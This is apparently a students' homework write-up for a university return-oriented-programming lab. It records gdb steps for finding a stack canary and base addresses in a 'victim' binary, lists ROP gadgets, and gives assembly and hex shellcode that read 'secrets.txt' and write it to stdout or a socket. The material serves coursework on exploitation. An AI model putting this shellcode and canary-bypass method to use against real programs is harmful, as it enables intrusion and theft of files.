@@ -1,0 +1,182 @@
+Team Members:
+
+1. Devharsh Trivedi (dtrived5@stevens.edu)
+2. Yuchen Zhang (yzhan219@stevens.edu)
+3. Dean Rodman (drodman@stevens.edu)
+
+--x--x--x--x--x-- 
+
+The code was tested on host: avalon
+
+--x--x--x--x--x--
+
+Task 1:
+
+- Find Canary
+
+	-- debug binary with filling buffer with 'A's
+
+	-- check the number of 'A's until canary is overwritten
+
+	-- check value of rax register
+		info registers rax
+		rax            0x1f895e64f9a58b00       2272451274763242240
+
+	-- check stack content
+	0x7fffffffe4c0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41 → buffer start
+	0x7fffffffe4c8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+	0x7fffffffe4d0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+	0x7fffffffe4d8: 0x00    0xb3    0x02    0x76    0x2f    0x37    0x87    0x27 → canary
+	0x7fffffffe4e0: 0xe0    0x49    0x55    0x55    0x55    0x55    0x00    0x00
+	0x7fffffffe4e8: 0x8f    0x4d    0x55    0x55    0x55    0x55    0x00    0x00 → return address
+	0x7fffffffe5d0: 0x00    0x40    0x55    0x55    0x55    0x55    0x00    0x00 → binary base address
+
+- Find Base Address
+
+	-- use stack start address from mappings
+
+	(gdb) info proc mappings
+	process 3668
+	Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+      0x555555554000     0x555555556000     0x2000        0x0 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
+      0x555555755000     0x555555756000     0x1000     0x1000 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
+      0x555555756000     0x555555757000     0x1000     0x2000 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
+      0x555555757000     0x555555778000    0x21000        0x0 [heap]
+      0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7ffff7bcd000     0x7ffff7dcd000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0 
+      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
+      0x7ffff7fe3000     0x7ffff7fe6000     0x3000        0x0 
+      0x7ffff7ff7000     0x7ffff7ff8000     0x1000        0x0 
+      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
+      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
+      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
+      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
+      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
+
+- Find Binary Address
+
+	-- Tried to find binary base address (starting point) with 'readelf'
+
+		$ readelf -a victim | grep -i "entry"
+		Entry point address:               0x9e0
+
+	-- Later changed it to the starting address (first line) displayed by 'info proc map'
+
+		(gdb) info proc mappings
+		process 3668
+		Mapped address spaces:
+
+	  Start Addr           End Addr       Size     Offset objfile
+      0x555555554000     0x555555556000     0x2000        0x0 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
+      0x555555755000     0x555555756000     0x1000     0x1000 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
+      0x555555756000     0x555555757000     0x1000     0x2000 /home/dtrived5/CS-576-ROP/HW3/assignment_files/victim
+      0x555555757000     0x555555778000    0x21000        0x0 [heap]
+      0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7ffff7bcd000     0x7ffff7dcd000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
+      0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0 
+      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
+      0x7ffff7fe3000     0x7ffff7fe6000     0x3000        0x0 
+      0x7ffff7ff7000     0x7ffff7ff8000     0x1000        0x0 
+      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
+      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
+      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
+      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
+      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
+
+--x--x--x--x--x-- 
+
+Task 2:
+
+--x--x--x--x--x-- 
+
+Task 3:
+
+- find ROP gadgets to pass arguments
+	0x0000000000000f33 : pop rdi ; ret
+	0x0000000000000e8f : pop rdx ; ret
+	0x0000000000000f31 : pop rsi ; pop r15 ; ret
+
+- assembly code for reading secrets.txt and write to stdout
+
+	.global _start
+
+	.text
+
+_start:
+	jmp path
+
+goback:
+	# open(secrets.txt)
+	xor	%rax, %rax
+	addb	$2, %al
+	#push	$path
+	pop	%rdi
+	xor	%rsi, %rsi
+	syscall
+
+	# read(secrets.txt)
+	mov	%rax, %rdi
+	sub	$0xfff, %sp
+	lea	0x08(%rsp), %rsi
+	xor	%rdx, %rdx
+	addb	$0xff, %dl
+	xor	%rax, %rax
+	syscall
+
+	# write(secrets.txt)
+	xor	%rax, %rax
+	inc	%rax			# system call 1 is write
+	mov	%rax, %rdi		# file handle 1 is stdout
+	mov	%rsp, %rsi
+        xor	%rdx, %rdx
+	addb	$0xff, %dl		# number of bytes
+        syscall
+
+	# exit(0)
+	xor	%rax, %rax
+	addb	$60, %al
+	xor	%rdi, %rdi
+	syscall
+
+path:
+	call goback
+	.ascii	"secrets.txt"
+
+- shellcode for reading secrets.txt and write to stdout
+
+\xeb\x41\x48\x31\xc0\x04\x02\x5f
+\x48\x31\xf6\x0f\x05\x48\x89\xc7
+\x66\x81\xec\xff\x0f\x48\x8d\x74
+\x24\x08\x48\x31\xd2\x80\xc2\xff
+\x48\x31\xc0\x0f\x05\x48\x31\xc0
+\x48\xff\xc0\x48\x89\xc7\x48\x89
+\xe6\x48\x31\xd2\x80\xc2\xff\x0f
+\x05\x48\x31\xc0\x04\x3c\x48\x31
+\xff\x0f\x05\xe8\xba\xff\xff\xff
+\x73\x65\x63\x72\x65\x74\x73\x2e
+\x74\x78\x74
+
+- shellcode for reading secrets.txt and write to socket
+
+\xeb\x41\x48\x31\xc0\x04\x02\x5f
+\x48\x31\xf6\x0f\x05\x48\x89\xc7
+\x66\x81\xec\xff\x0f\x48\x8d\x74
+\x24\x08\x48\x31\xd2\x80\xc2\xff
+\x48\x31\xc0\x0f\x05\x48\x31\xc0
+\x48\xff\xc0\x80\xc2\x04\x48\x89
+\xe6\x48\x31\xd2\x80\xc2\xff\x0f
+\x05\x48\x31\xc0\x04\x3c\x48\x31
+\xff\x0f\x05\xe8\xba\xff\xff\xff
+\x73\x65\x63\x72\x65\x74\x73\x2e
+\x74\x78\x74
